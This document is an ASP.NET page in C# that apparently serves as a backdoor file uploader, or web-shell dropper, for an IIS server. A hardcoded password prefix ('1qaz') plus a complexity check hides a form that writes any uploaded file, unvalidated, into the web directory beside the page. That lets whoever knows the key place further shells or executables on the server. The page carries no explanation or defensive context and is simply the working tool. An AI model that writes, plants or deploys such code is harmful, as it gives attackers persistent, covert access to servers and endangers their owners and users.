<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">


<script runat="server">
    
    private const string Pass = "1qaz";
   /* private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";*/


        protected void Page_Load(object sender, EventArgs e)
         {
             id1.Visible = true;
             Div1.Visible = false;
         }

        protected void btnExecute1_Click(object sender, EventArgs e)
        {
            
            string password = txtAuthKey.Text;
            string result = password.Substring(0, 4);
            bool h = Regex.IsMatch(password, @"^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[~`!@#\$%\^&\*,.])(?!.*\s).*$");
            if (h == false | result != Pass)
            {
                 id1.Visible = false;
                 Response.Write("Sorry Wrong Password");
            }
            if (h == true & result == Pass)
            {
                Div1.Visible = true;
                id1.Visible = false;
            }
            
        }

         
         
        protected void UploadButton_Click(object sender, EventArgs e)
        {

            
            Response.Write(this.UploadFile());
            
        }

        private string UploadFile()
        {
            if (Request.Files.Count != 1)
            {
                return "No file selected";
            }
            HttpPostedFile httpPostedFile = Request.Files[0];
            int fileLength = httpPostedFile.ContentLength;
            byte[] buffer = new byte[fileLength];
            httpPostedFile.InputStream.Read(buffer, 0, fileLength);
            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
            {
                fileStream.Write(buffer, 0, buffer.Length);
            }
            return "File uploaded";
        }

</script>











<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Upload Files</title>
    </head>
<body>
    <form id="formCommand" runat="server">
    <div class="header" id="id1" runat="server">
        <table>
            <tr>
                <td width="30">Auth Key:</td>
		        <td><asp:TextBox id="txtAuthKey" runat="server"></asp:TextBox></td>
            </tr>
            </tr>
                <td>&nbsp;</td>
                <td><asp:Button ID="Button2" runat="server" OnClick="btnExecute1_Click" Text="Execute" /></td>
            </tr>
        </table>
    </div>
    <div class="header" id="Div1" runat="server">
                            <asp:FileUpload ID="FileUpload2" runat="server" />
        <br/>
        <asp:Button ID="Button1" runat="server"
                    OnClick="UploadButton_Click"
                    Text="Upload File" />
        <br/>
        <asp:Label ID="Label1" runat="server" />
    </div>
    </form>
